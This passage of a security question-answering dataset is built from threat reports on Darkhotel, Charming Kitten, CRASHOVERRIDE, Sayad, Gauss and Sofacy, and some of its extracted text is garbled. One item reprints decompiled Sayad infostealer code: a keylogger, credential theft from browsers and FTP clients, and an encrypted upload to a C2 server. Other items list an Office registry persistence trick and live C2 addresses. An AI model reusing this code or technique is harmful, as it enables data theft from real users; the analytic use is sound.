backdoor seeks from a system is not decrypted until runtime. Like the \"information-stealer\" component documented in our , this component seeks to steal a set of data with which to identify the infected system. Much of the information is collected with the same set of calls, i.e. kernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:\n\u25cf Default system codepage\n\u25cf Network adapter information\n\u25cf Processor architecture\n\u25cf Hostname and IP address\n\u25cf Windows OS and Service Pack versions\nEssentially, much of this information-stealer code is the same as that observed in previous attacks.\n\nWhat strategies does Darkhotel employ to evade detection, and how do these strategies reflect the group's adaptation to better-defended environments?",
    "output": "Darkhotel employs several strategies to evade detection, including the use of stolen certificates and layers of encryption. The group maintains a stockpile of stolen certificates to sign their downloaders and backdoors, making them appear legitimate. Additionally, Darkhotel uses strong obfuscation techniques and anti-detection technology to identify and evade defensive technologies on newly-infected systems. For example, their signed downloaders decrypt a set of anti-malware strings to identify defensive technologies and open each process, looking for a matching image name. This reflects the group's adaptation to better-defended environments, as they prefer not to burn these stolen digital certificates and instead focus on evading detection through sophisticated methods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nSmall Headline: First Vector - A message with a link pretending to be Google Drive\nIn another phishing case, a link to Google Drive is received, supposedly from an unknown person which claims to receive too many spam messages from the victim's address, and directs the victim to a Google Drive containing the proves to this:\nEmail sent allegedly from \"Sandra Trentini', which is not related to any of the victims. In that case, Charming Kitten added a profile picture with 2 letters that represent the alleged sender (ST for Sandra Trentini), as part as their dissembling efforts\nIn a third case, the victim received a message from a colleague's email, personally addressing the victim to read an article this colleague is currently working on. To add credibility, the attacker also claims to have shared the research with another friend.\nThe links which appear in the mail lead to a dedicated Google Site, set up by the attacker; those links contain the word 'Drive', although they are Google Sites links, probably for additional camouflage:\nYet, upon entering the site, the attackers try to manipulate the attacked to think that they are at a Google Drive site which contains a link to download the article.\nGoogle's Sites phishing page executed by the group. Note that the title of the site is 'Drive', which customized by the attackers.\nClicking the download link will make Google redirect to a domain shortened by a shortening service, which will not show the actual address to which the victim is taken, thus increasing camouflaging. Another important point-every page at Google Sites is unique to the attacked.\nWhen the specific attack will end, the attackers will remove the site from the address shortening service or will redirect the address to a true email service. Here are two examples:\nAttempt to enter the domain leads to the original Google site\nUpon an attempt to enter, a Redirect is performed to the Google Account login page, while the malicious site appears in the address line\nIf the attacked has opened the aforementioned link, they will be directed to the malicious site. At the present attack wave, we have identified a '.site' TLD dominance. Among the newly opened site:\nThe site, which the attacked will visit, impersonates entrance to Google services. The attackers try to manipulate the victims to believe, that in order to download the file they need to log in to their Google account (for the file is allegedly from Google Drive). Another social engineering technique is to identify the Google Site from which the victim was directed and to pair the phishing page with its (the site's) email. In other words, the victim receives an email from the attacker with a link which was prepared for them personally. Identifying the attack -at the address line, the victim's email appears, and if it will be changed, the email presented at the site will change as well.\nSmall Headline: Fourth Vector \u2013 Social Networks imperonation\nNote that the domains that are presented in the directory are related to the impersonation subject and not the malicious domain.\nAs it reads from the ZIP files, the attackers prepare their phishing sites with WordPress and Crunch Press interfaces. Every folder contains relevant files, such as logos, persons to impersonate (for instance, one Nooshin Sadegh-Samimi5, and Iranian who has joined NAIC in February 2019 and works as an organizing fellow) etc.\n5 https://www.niacouncil.org/about-niac/staff-board/nooshin-sadegh-samimi/\nBig Headline: Digital Infrastructure\nThrough a pivot we have conducted on the main domain that we have identified in our research we have found more than eight new and unknown domains, all of which bear the '.site' TLD. For instance:\nEach of these domains resolves to a different IP, yet almost all of them point -through DNS research -at the same Nameserver -ns11025[.]ztomy[.]com:\nWe have succeeded to identify the new domains through this Nameserver.\nAs we pointed out, we identified a step up in the recent campaign regarding the targeting of Yahoo accounts. The group has acted in the past, in 2017, to acquire the usernames and passwords for those accounts, yet it seems that in the recent years it has moved its focus to Google accounts. In this research, we found that the threat actor focuses again in Yahoo accounts and impersonation to Yahoo services. Below an example to an URL address of one of the group's phishing sites which depicts an impersonation to Yahoo services such as YMail.\nhxxps://mobiles.com-identifier[.]site/ ma\"1/secu relogi n/cha llenge/u rl?ucode=dl0Sad2b-2f7d-4193-a303-03eb32967133&service=ma i lservice&type=password\nIn our previous report we uncovered a server-registered method which in, the malicious server will redirect the client from the phishing website to the original website (HTTP 302 in port 442 or 301 in port 80). In this time too it has set its server in a way that redirects to the original Yahoo site, if a not\u00addedicated (i.e. specifically authorized) entrance is attempted.\n6\n6\nThis photo presents one of these DNS changes within the malicious infrastructure. The domain 'identifier-activities[.]info' moved from one IP to another and the NS of it changed to the malicious NS 'ns2[.]microsoftinternetsafety[.]net'. This domain is currently resolved to the IP address 40.112.253[.]185.\nFollowing a Maltego graph summarized the changes in the infrastructure:\nThis IP address currently resolves two highly suspicious domains that are attributed to the group -'login-gov[.]info', and broadcastnews[.]pro'. We assess with a medium level of certainty that the domains may be utilized for the continuation of the campaign against governmental entities in the US, and against journalists, respectively. Please note that the domains point to a sinkhole of Microsoft, as mentioned in the official compliant of Microsoft7.\nMoreover, under this IP we identified the domain 'bahaius[.]info' which impersonates to the official websites of the Bahais in the United States of America, 'bahai.us'.\n7 (<https://noticeofpleadings.com/strontium/files/prop_ord_dj_pi_appc.pdf>)https:ljnoticeofpleadings.com/strontium/files/prop ord dj pi appc.pdf\n\nHow does Charming Kitten's digital infrastructure support their phishing campaigns, and what steps do they take to ensure their operations remain covert?",
    "output": "Charming Kitten's digital infrastructure includes multiple domains with the '.site' TLD, all pointing to the same Nameserver. They have shifted their focus from Google accounts to Yahoo accounts, creating phishing sites that impersonate Yahoo services. The group sets up their servers to redirect unauthorized access attempts to the original Yahoo site, making it difficult for non-targeted users to detect the phishing activity. They also use domain shortening services and dynamic content to personalize the phishing experience. Additionally, they frequently change DNS settings and IP addresses to evade detection. For instance, the domain 'identifier-activities[.]info' moved from one IP to another and changed its Nameserver to a malicious one, highlighting their efforts to maintain covert operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Launcher Module\nKey Features\n\u2022 Loads payload modules which manipulate the ICS and cause destruction via the wiper\n\u2022 Starts itself as a service likely to hide better\n\u2022 Loads the payload module(s) defined on the command line during execution\n\u2022 Launches the payload and begins either 1 or 2 hours countdown before launching the data wiper (variant dependent)\nDetails\nWithin the attack sequence, the ICS payload modules and data wiper module must be loaded by a separate loader EXE. Dragos obtained one sample of this file called the Launcher.\nThe launcher takes three parameters on start:\nOn launch, the sample analyzed starts a service named defragsvc.  It then loads the module DLL via an exported function named Crash. A new thread is created at the highest priority on the executing machine.  Control then passes from the launcher to the loaded module while the launcher waits two hours before executing the data wiper.\n\nHow does the CRASHOVERRIDE malware ensure persistence and what is the role of the 'Launcher' module in initiating the attack sequence?",
    "output": "A: CRASHOVERRIDE ensures persistence by starting itself as a service, likely to hide better. The 'Launcher' module plays a critical role in initiating the attack sequence. It takes three parameters on start and begins by starting a service named 'defragsvc'. It then loads the module DLL via an exported function named 'Crash', creating a new thread at the highest priority on the executing machine. Control is passed from the launcher to the loaded module, while the launcher waits for two hours before executing the data wiper. This sequence ensures that the ICS payload modules and data wiper module are properly loaded and executed, leading to the manipulation of the ICS and potential destruction.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: [User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\",7812\nThe malware authors left some debugging messages that indicate the different stages of the Sayad Client initialization. The code also handles and collects all uncaught exceptions thrown during the execution of the\nmalware by attaching to AppDomain.UnhandledException and Application.ThreadException events.\nIn the next step, the client loads the configuration discussed in a previous section and then proceeds to start up all data collection components, as shown in the snippet below.\nprivate static void modopt(CallConvStdcall) Main()\n{\nApplication.SetUnhandledExceptionMode(\nUnhandledExceptionMode.CatchException);\nAppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(\nProgram.TotalExceptionHandler);\nApplication.ThreadException += new ThreadExceptionEventHandler(\nProgram.TotalExceptionHandler);\ntry\n{\nbool flag3;\nClientExceptions = new List<ExceptionSerializeModel>();\n_uploadQuque = new UploadQueue(); string path = CommonPath.ClientPath() +\nPath.DirectorySeparatorChar + \"base.dll\";                 while (!File.Exists(path))\n{\nThread.Sleep(int.Parse(Resources.ShortSleepTime));\n}\nDebug.Write(\"Config loaded\"); string[] strArray = File.ReadAllLines(path);\nExecutableConfigInfo info2 = new ExecutableConfigInfo {\nBuildId = strArray[0].Trim(),\nPublicKey = strArray[1].Trim(),\nPostURL = strArray[2].Trim(),\nResourceURL = strArray[3].Trim(),                     screenShotCount = strArray[4].Trim(),                     screenShotInterval = strArray[5].Trim(),                     startupScreenShot = strArray[6].Trim()\n};\n_configInfo = info2;\ntry\n{\nif (!string.IsNullOrEmpty(_configInfo.PostURL))                    {\nUri uri = new Uri(_configInfo.PostURL);\n_hostAddress = uri.OriginalString.Replace(                             uri.AbsolutePath, \"\");\n}\n}\ncatch\n{\nreturn;\n}\nCryptionKeyInfo info3 = new CryptionKeyInfo {\nKeySize = int.Parse(Resources.RSAKeySize),\nPublicKey = _configInfo.PublicKey\n};\n_keyInfo = info3;\nDebug.Write(\"Config parsed\"); if (!string.IsNullOrEmpty(_hostAddress))\n{\nnew Wiper(new Http(), _hostAddress,\n_configInfo.BuildId).StartWiper();\nDebug.Write(string.Format(\"wiper {0}\", _hostAddress));\n} new StorageUploader(new Http(), _configInfo.PostURL,\n_configInfo.BuildId).StartUploader();\nDebug.Write(\"storage uploader\"); new Updater(new Http(),\n_hostAddress, _configInfo.BuildId).StartUpdater();\nDebug.Write(\"updater\"); int keyLogLimitSize = int.Parse(\nResources.KeyloggerLogLimitSize); new Thread(delegate {\nKeyLoggerProc(new Http(), keyLogLimitSize);\n}).Start();\nDebug.Write(\"keylogger\"); int screenshotCount = int.Parse(\n_configInfo.screenShotCount); int screenshotInterval = int.Parse(\n_configInfo.screenShotInterval);\nnew Thread(delegate {\nScreenShotProc(new Http(),                                    screenshotInterval, screenshotCount);\n}).Start();\nDebug.Write(\"Screenshot\");\nDebug.Write(_configInfo.ResourceURL); if (SQLiteFinder.FindSqlite(_configInfo.ResourceURL))                {\nDebug.Write(\"sqlite found & start collectiong data\");\nSerializeModel dataToSerialize = NewSerializerModel();                     dataToSerialize.MachineInfo =\nnew MachineInfo().GetMachineInfo();\nDebug.Write(\"Machine info collected\");\nList<IBrowser> list = new List<IBrowser> { new Chrome(), new Firefox(), new Opera()\n};\nforeach (IBrowser browser in list)\n{\ndataToSerialize.BrowsersInfo.Add(                             browser.GetBrowserInfo());\n}\nDebug.Write(\"browser ok\");\nList<IMessenger> list2 = new List<IMessenger> { new Pidgin(), new YahooMessenger(), new Gtalk()\n};\nforeach (IMessenger messenger in list2)\n{\ndataToSerialize.MessengersInfo.Add(                             messenger.GetMessengerInfo());\n}\nDebug.Write(\"messenger ok\");\nList<IVpn> list3 = new List<IVpn> { new Proxifier()\n};\nforeach (IVpn vpn in list3)\n{\ndataToSerialize.VpNsInfo.Add(vpn.GetClientInfo());\n}\nDebug.Write(\"vpn ok\");\nList<IFtpClient> list4 = new List<IFtpClient> { new FilezillaClient(), new Winscp()\n};\nforeach (IFtpClient client in list4)\n{\ndataToSerialize.FtpClientsInfo.Add(                             client.GetFtpClientInfo());\n}\nDebug.Write(\"ftp client ok\");\nList<IFtpServer> list5 = new List<IFtpServer> { new FilezillaServer()\n};\nforeach (IFtpServer server in list5)\n{\ndataToSerialize.FtpManagementsInfo.Add(                             server.GetFtpServerInfo());\n}\nDebug.Write(\"ftp server ok\");\nList<IRemoteClient> list6 = new List<IRemoteClient> { new Putty(), new RemoteDesktop()\n};\nforeach (IRemoteClient client2 in list6)\n{\ndataToSerialize.RemoteClientsInfo.Add(                             client2.GetRemoteClientsInfo());\n}\nDebug.Write(\"rdp ok\");\nList<IFileCollector> list7 = new List<IFileCollector> {\nnew Kerio()\n};\nforeach (IFileCollector collector in list7)\n{\ndataToSerialize.ExtraFiles.Add(collector.GetFile());\n}\nDebug.Write(\"kerio ok\"); string[] skypeDatabases = Skype.GetSkypeDatabases(); foreach (string str2 in skypeDatabases)\n{\nstring destFileName = Path.Combine(\nPath.GetTempPath(), Path.GetFileName(str2));\nFile.Copy(str2, destFileName); if (File.Exists(destFileName))\n{\nDirectoryInfo parent = new\nDirectoryInfo(str2).Parent;\nif ((parent != null) && File.Exists(destFileName))                            {\nExtraFileSerializeModel item =\nnew ExtraFileSerializeModel {\nName = Resources.SkypePathName,\nDescription = parent.Name,\nData = File.ReadAllBytes(destFileName)\n};\ndataToSerialize.ExtraFiles.Add(item);\n}\nFile.Delete(destFileName);\n}\n}\nDebug.Write(\"skype ok\"); byte[] bytetoEncrypt = ModelSerializer.SerializeAndCompress(                        dataToSerialize);\nDebug.Write(\"serialize data ok\"); byte[] buffer = EncryptBuffer(bytetoEncrypt, _keyInfo);\nHttp http = new Http(); if (!http.UploadBuffer(buffer, _configInfo.BuildId,\n_configInfo.PostURL))\n{\nFile.WriteAllBytes(\nPath.Combine(CommonPath.ClientStorage(),\nPath.GetRandomFileName()), buffer);\n}                } string startupKeyName = Resources.StartupKeyName; if (!Startup.CheckStartup(startupKeyName))                {\nStartup.SetStartup(startupKeyName,\nApplication.ExecutablePath);\n}\ngoto Label_07DD;\nLabel_07D4:\nThread.Sleep(-1);\nLabel_07DD:\nflag3 = true; goto Label_07D4;\n}\ncatch (Exception exception)            {\nAddExceptionToExceptionList(exception);\n}\n}\nThe Sayad Client uses a very trivial method for uploading the encrypted user and host data to the malicious server. Here is the UploadBuffer method that uses .NET WebClient class to upload the data.\nBoth the Binder and the Sayad Client have been built with debugging information which reveals some details about the source code locations for these two .NET projects.\nf:\\Projects\\C#\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb\nF:\\Projects\\C#\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb\nBig Headline: Network Activity\nCommunication with the C2 server is limited to transferring collected data from the user and the host to the C2 server. The stolen data being uploaded to the malicious server is encrypted first using a RSA public key which is stored in the malware configuration file. The Sayad Client (DiagnosticsService.dll) implements an HTTP client that uploads the encrypted data to the malicious Web server with host name \"0o0o0o0o0[dot]com\" and IP address 107.6.182.179. The Binder component doesn't implement any communication features. The following is a short segment from Vinsula network activity report.\n+ WEXTRACT.exe [Process Id: 3508]\n+ ~8f60957b3689075fa093b047242c0255.exe [Process Id: 2544]\n+ rundll32.exe [Process Id: 2596] [Parent Id: 2544]\nCommand Line: rundll32.exe \"DiagnosticsService.dll\",78121\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1325 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1326 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1326  ==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1325  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1326 <==  107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1325 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1327 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1327  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1327 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1328 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1329 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1328  ==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1329  ==> 107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1328 <==  107.6.182.179:80\n=>  TCP IPv4 recv 192.168.64.167:1329 <==  107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1330 <==> 107.6.182.179:80\n=>  TCP IPv4 UNKNOWN 192.168.64.167:1331 <==> 107.6.182.179:80\n=>  TCP IPv4 send 192.168.64.167:1330  ==> 107.6.182.179:80\nAccording to the (<http://www.ipligence.com/geolocation>)http://www.ipligence.com/geolocation service, the malicious Web server is located in the Netherlands.\nBelow is the WHOIS information for the malicious host 0o0o0o0o0[dot]com (IP 107.6.182.179). The domain was registered on June 30, 2014. Interestingly, the registrant, admin and tech email addresses are domain@microsofts.com. One wonders if the registrar, OnlineNIC, Inc, is verifying whether or not these are real email addresses.\nBig Headline: YARA detection rule\nBased on the details that have been identified, we can create two simple YARA rules for detection of the Sayad Binder and Sayad Client. Hopefully this will help other malware researchers and security companies.\n{\nmeta:\ndescription = \"Sayad Infostealer Binder\"\nin_the_wild = true\nstrings:\n$pdbstr =\n\"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Binder\\\\obj\\\\Debug\\\\Binder.pdb\"\n$delphinativestr = \"DelphiNative.dll\" nocase\n$sqlite3str = \"sqlite3.dll\" nocase\n$winexecstr = \"WinExec\"\n$sayadconfig = \"base.dll\" wide\ncondition:\nall of them\n}\nrule Vinsula_Sayad_Client : infostealer\n{\nmeta:\ncopyright = \"Vinsula, Inc\"   description = \"Sayad Infostealer Client\"\nactor = \"Sayad Client\"   in_the_wild = true\nstrings:\n$pdbstr =\ncondition:\nall of them\n}\n\nQ: How does the Sayad malware handle exceptions during its execution, and why is this significant for its robustness?",
    "output": "A: The Sayad malware handles exceptions by attaching to AppDomain.UnhandledException and Application.ThreadException events. This means that it catches all uncaught exceptions thrown during the execution of the malware. By doing so, the malware ensures that it continues to run even if errors occur, making it more robust and harder to detect through crashes or unexpected behavior. This approach helps the malware maintain persistence and continue its malicious activities without interruption.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Windig.ocx\nName of the module used in Gauss: \"Lagrange\"\nThe module is a Windows DLL file with one exported function called \"GlobalDeleteAtomL.\"\\\nThe module reads the registry key that is originally created by \"ShellHW\" module :\nHKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Reliability\nShutdownInterval = binary data\nIf the value is not present in the registry, it writes a random value into that key.\nThen, it creates a new TrueType font file \"%SystemRoot%\\fonts\\pldnrfn.ttf\" (62 668 bytes long) from a template and using randomized data from the ShutdownInterval key. The creation time of the font file is set to the creation time of the Arial font, %SystemRoot%\\fonts\\ARIAL.TTF.\nThen, a custom font named \"Palida Narrow\" is registered in the system font storage using the \"AddFontResourceW\" API function. The module also creates a registry value:\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Fonts\nPalida Narrow (TrueType)=pldnrfn.ttf\nThe purpose of the addition of this font is not yet known. It appears to contain valid Western, Baltic and Turkish symbols.\nFont information from Font Viewer\nBig Headline: Gauss C&C Information\nTo upload data stolen from infected machines, Gauss uses a number of command-and-control servers predefined in its flexible configuration.\nHere's a look at the decrypted configuration data:\nIn the example above, we can see the C&C domains/hosts together with the name of the script (userhome.php) on the server which is used for communication.\nGoing through the multitude of Gauss samples, we identified several domains used as C&C servers:\n\u25ba *.gowin7.com\n\u25ba *.secuurity.net\n\u25ba *.datajunction.org\n\u25ba *.bestcomputeradvisor.com\n\u25ba *.dotnetadvisor.info\n\u25ba *.guest-access.net\nDepending on the variant, * can be 'a' or 'b' or 'c' \u2013 and so on.For instance, a fully qualified hostname as in the example above is \"b.gowin7.com\".\nMost samples we have use \"*.gowin7.com\" and \"*.secuurity.net\". The domains \"gowin7.com\" and \"secuurity.net \" have been registered by  an \"Adolph Dybevek, which is most likely a fake identity:\nowner-name: Adolph Dybevek\nowner-address: Prinsen gate 6\nowner-city: Oslo\nadmin-address: Prinsen gate 6\nICANN Registrar: UNITED-DOMAINS AG\nCreated: 2012-03-15\nExpires: 2013-03-15\nUpdated: 2012-03-15\nAs in the case of Flame these domain registration addresses point to existing businesses.  For example, at Prinsens Gate 6 in Olso, we find a hotel in Norway:\nSimilarly, many of Flame C&D domain fake registrations used addresses of hotels.\nDuring the period of monitoring, we observed these two main domains pointing to two different servers in India and Portugal. Based on passive DNS research, we identified three other servers, located in the US which appear to have been used as C&C.\nThe hosts \"gowin7.com\" and \"secuurity.net\"   pointed to the following IP addresses:\nOn 29th of June, 2012, the two C&C domains \"gowin7.com\" and \"secuurity.net\" were changed from IP 109.71.45.115 to a new IP 182.18.166.116.\nBoth servers were shut down around July 13th, 2012. Prior to shut down, we managed to collect important information. Both appeared to be running Debian Linux, which is consistent with the Flame C&C servers. They were listening on ports 22, 80 and 443. The SSL certificates were self-signed, once again, the same as in the case of Flame. Here's the certificate for the server in Portugal:\nIf we are to believe the information in the certificate, it was generated on 17 Feb 2012.\nThe server at 182.18.166.116 (India) appears to currently host two other related domains:\n\u25ba bestcomputeradvisor.com\n\u25ba dotnetadvisor.info\nBoth have been registered by somebody named Gilles Renaud, probably another fake identity:\nRegistrant:\nGilles Renaud\nNeugasse 10\nZurich, Zurich 8005\nCH\nThey were previously hosted in the US, at the IPs: 173.204.235.204 and 173.204.235.196.\nWe currently have seen samples which used {e,g,h}.bestcomputeradvisor.com and \"c.dotnetadvisor.info\" for command-and-control. It's quite possible that other samples exist pointing to different hosts.\nThe additional domains  \"datajunction.org\" and \"guest-access.net\" can be found in some samples and it is also used for C&C communications. We currently have samples which use \"c.datajunction.org\" and \"d.datajunction.org\" but there are probably others using \"a.*\" and \"b.*\".\nBoth have been registered by somebody named \"Peter Kulmann,\" probably another fake identity:\nRegistrant Name:Peter Kulmann\nRegistrant Street1:Antala Staska 1301/19\nRegistrant Street2:\nRegistrant Street3:\nRegistrant City:Prague\nRegistrant State/Province:\nRegistrant Postal Code:14000\nRegistrant Country:CZ\nThe address \"Antala Staska 1301/19\" appears once again to be fake \u2013 pointing to a supermarket/pharmacy in Prague:\nCurrently (as of August 2012), all the  \"*.datajunction.org\" hosts point to the C&C server in India. Previously, they pointed to the server in Portugal.  Just like the others, they were previously hosted  in US.\nIn addition to these, we identified another domain named \"dataspotlight.net\" which was hosted on the same servers.  The registrant is unknown and we couldn't find any samples using it, however, it is probably related to the others.\nBig Headline: Conclusion\nGauss is the most recent development from the pool of cyber-espionage projects that includes Stuxnet, Flame and Duqu. It was most likely created in mid-2011 and deployed for the first time in August-September 2011.\nIts geographical distribution is unique; the majority of infections were found in Lebanon, Palestine and Israel. One of the modules from Jan 2012 contains the path \"c:\\documents and settings\\flamer\\desktop\\gauss_white_1\". The \"flamer\" in the path above is the Windows username that compiled the project. Given the focus on Lebanon, the \"white\" version identifier can probably be explained as following: \"the name Lebanon comes from the Semitic root LBN, meaning \"white\", likely a reference to the snow-capped Mount Lebanon.\" (Wikipedia)\nCode references and encryption subroutines, together with the Command and Control infrastructure make us believe Gauss was created by the same \"factory\" which produced Flame. This indicates it is most likely a nation-state sponsored operation.\nBetween Gauss' functions, the \"Winshell.ocx\" module which gives the name to the malware as \"Gauss\", steals credentials required to access online banking accounts for several Lebanese banks \u2013 including the Bank of Beirut, Byblos Bank and Fransabank. This is the first publicly known nation-state sponsored banking Trojan.\nAnother feature which makes Gauss unique is its encrypted payload, which we haven't been able to unlock. The payload is run by infected USB sticks and is designed to surgically target a certain system (or systems) which have a specific program installed. One can only speculate on the purpose of this mysterious payload.\nThe discovery of Gauss indicates that there are probably many other related cyber-espionage malware in operation. The current tensions in the Middle East are just signs of the intensity of these ongoing cyber-war and cyber-espionage campaigns.\n\nQuestion: Why does the Gauss malware create a custom TrueType font named 'Palida Narrow' and what steps does it take to achieve this?\n\nAnswer:",
    "output": "The Gauss malware creates a custom TrueType font named 'Palida Narrow' for reasons that are not entirely clear, but it appears to contain valid Western, Baltic, and Turkish symbols. The process involves reading a registry key created by the 'ShellHW' module, writing a random value if the key is not present, creating a new TrueType font file from a template using randomized data, setting the creation time to match that of the Arial font, registering the font using the 'AddFontResourceW' API function, and creating a corresponding registry value under HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Fonts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nThe progression of semi-autonomous malware into globe-spanning botnets with victims numbering in the millions continues to accelerate. In short, botnets, and the criminal ecosystem that supports them, lie at the heart of modern cybercrime. Specialist contractors and service providers occupy every online niche, enabling both newbie hackers and professional botnet operators to overcome technological hurdles and operational barriers for a small price \u2013 typically stolen identities or access to hijacked systems rather than dollars.\nAll it takes to get started is an Internet search engine and the ability to install software on a computer. Devastating attacks start with a nominal fee for acquiring advanced malware construction tools capable of automatically generating customized botnet agents dramatically superior to tools used by professional hackers only three years ago. Fierce competition within the ecosystem has resulted in the commoditization of these tools and services, which has lowered price points and driven suppliers to differentiate with 24x7 support, money-back guarantees, replacement warrantees and even SLAs.\nMajor international corporations have begun to publicly acknowledge this electronic threat. On January 12, 2010, Google announced that it had been the victim of a targeted attack and had subsequently identified over 34 additional organizations that had similarly been breached by the same criminal team. One major industrial powerhouse has publicly focused on the risks posed by persistent electronic attacks by including references to these threats in their quarterly 10-K filing.\nRead the text above and answer this question: How does the commoditization of advanced malware construction tools within the botnet ecosystem impact the landscape of modern cybercrime, particularly in relation to the Aurora Botnet?",
    "output": "The commoditization of advanced malware construction tools within the botnet ecosystem significantly impacts modern cybercrime by lowering the barriers to entry for both novice and professional botnet operators. This commoditization is driven by fierce competition among suppliers, leading to reduced prices and enhanced services such as 24x7 support, money-back guarantees, replacement warranties, and even Service Level Agreements (SLAs). As a result, sophisticated malware tools that were once exclusive to professional hackers are now accessible to a broader range of users. This democratization of advanced tools has contributed to the proliferation of botnets, including the Aurora Botnet, making it easier for criminals to launch devastating attacks. Major corporations, such as Google, have publicly acknowledged the severity of this threat, highlighting the widespread impact of these electronic attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Delivery\nOn May 28, 2016, attackers sent a spear-phishing e-mail to a U.S. government entity using an email address belonging to the Ministry of Foreign Affairs of another country. Analysis of the attack revealed a high likelihood that the sender's email address was not spoofed and is instead a result of a compromised host or account belonging to that Ministry.\nThe targeted email had a subject of \"FW: Exercise Noble Partner 2016\", which is a reference to a joint NATO training effort between the United States and Georgia. The email contained an RTF file as an attachment, with the filename \"Exercise_Noble_Partner_16.rtf,\" reflecting the same training exercise. We have also seen related delivery documents with filenames that have a Russian military theme (Putin_Is_Being_Pushed_to_Prepare_for_War.rtf and Russian anti-Nato troops.rtf), purportedly targeting organizations in Poland according to a blog published by (<http://malware.prevenity.com/2016/05/analiza-ataku-z-maja-2016-na-instytucje.html>)Prevenity.\nThe RTF file is a weaponized document that attempts to exploit CVE-2015-1641 to drop two files to the system, specifically, \"btecache.dll\" and \"svchost.dll\". The \"btecache.dll\" file is a Trojan that loads and executes \"svchost.dll\", which is a Carberp variant the Sofacy Trojan. Surprisingly, unlike many other espionage actors who display decoy documents after successful exploitation, this RTF document does not drop or open a decoy document after exploiting the vulnerability.\nIn the installation process, we observed the delivery document creating a very interesting registry key that it uses for persistence to run the Trojan. The path to the \"btecache.dll\" file is added to the following registry key:\nSoftware\\Microsoft\\Office test\\Special\\Perf\\: \"C:\\Users\\[username]\\AppData\\Roaming\\btecache.dll\"\nThis registry key is interesting, because unlike traditional methods of maintaining persistence, it does not automatically run the \"btecache.dll\" file at system start up. Instead, this registry key will cause the DLL to load only when the user opens any Microsoft Office application, such as Word or Excel. This is the first time Unit 42 has seen the Sofacy group, or any other threat group for that matter, use this tactic for persistence purposes.\nAn added benefit for the threat actor to using this specific tactic for persistence is that it requires user interaction to load and execute the malicious payload, which can cause challenges for detection in automated sandboxes.\nBig Headline: The Carberp variant of Sofacy\nThe \"btecache.dll\" file is the loader Trojan that is responsible for loading the \"svchost.dll\" DLL and executing it. Both the \"btecache.dll\" and \"svchost.dll\" files contain code from the leaked Carberp source code, specifically the API resolution functions, as well as the RC2 key. The Sofacy group has used the Carberp source code in the past, specifically discussed in a (<https://labsblog.f-secure.com/2015/09/08/sofacy-recycles-carberp-and-metasploit-code/>)blog by F-Secure, which is the reason we call this Trojan the Carberp variant.\nThe \"svchost.dll\" file contains the bulk of the functionality of this Trojan, which at a high level is a downloader that\nallows the threat actors to gain an initial foothold on the system. The Trojan sends network beacons to its command and control (C2) serverallowing the threat actors to identify targets of interest. The threat actors can then respond to these network beacons to download and execute additional secondary payloads on the system.\nThe Trojan delivered in this attack contains two network locations that it will send network beacons to, specifically \"google.com\" and \"191.101.31.6\". These beacons are sent to the legitimate website google.com as an attempt to hide the true C2 beacons sent to the actual C2 server hosted at 191.101.31.6. The network beacons are sent using HTTP POST requests with URLs created largely with random characters. There are two exceptions where random characters are not used to construct the URL, specifically the file extension that is randomly chosen from .xml, .pdf, .htm or .zip and the base64 encoded value at the end of the URL. The base64 encoded data is a string (\"J04aLsxVhHBkr19CYr0\") hardcoded within the Trojan that it will then encrypt using a custom algorithm. Figure 1 shows an example beacon sent from the Trojan to the C2 server during analysis.\nThe POST data seen in the beacon in Figure 1 is base64 encoded and encrypted using the same custom algorithm used to encrypt the data in the beacon URL. We decrypted the data to determine its purpose and found the cleartext seen in Figure 2.\n,^Bid=I,;<&w@[System Process]\nSystem smss.exe\ncsrss.exe\nwininit.exe\ncsrss.exe\nwinlogon.exe services.exe\nlsass.exe\nlsm.exe\nsvchost.exe\nsvchost.exe\nsvchost.exe\nsvchost.exe\nsvchost.exe\nsvchost.exe\nsvchost.exe\nspoolsv.exe svchost.exe\ntaskhost.exe\nuserinit.exe\ndwm.exe\nexplorer.exe svchost.exe\ncmd.exe\nconhost.exe\nreader_sl.exe\nsvchost.exe\ncmd.exe\nconhost.exe\nSearchIndexer.exe\nSearchProtocolHost.exe\nSearchFilterHost.exe\nSearchProtocolHost.exe\nexplorer.exe svchost.exe\nsvchost.exe\ndisk=IDE\\DiskMAXTOR_HARDDISK_________________________2.2.1___\\5&2770a7af&0&0.0.0 